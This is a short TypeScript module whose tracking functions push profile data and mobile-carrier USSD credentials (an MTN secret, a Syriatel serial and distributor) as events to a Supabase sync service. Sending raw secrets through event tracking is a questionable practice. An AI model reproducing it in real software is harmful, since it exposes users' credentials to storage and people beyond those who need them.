import { pushEvent } from "@/lib/supabase-sync";

export function trackProfileUpdate(data: { phone?: string; shop_name?: string }) {
  pushEvent("profile_update", data);
}

export function trackUssdCredentials(data: {
  mtnSecret: string;
  syriatelSerial: string;
  syriatelDistributor: string;
}) {
  pushEvent("ussd_credentials", data);
}
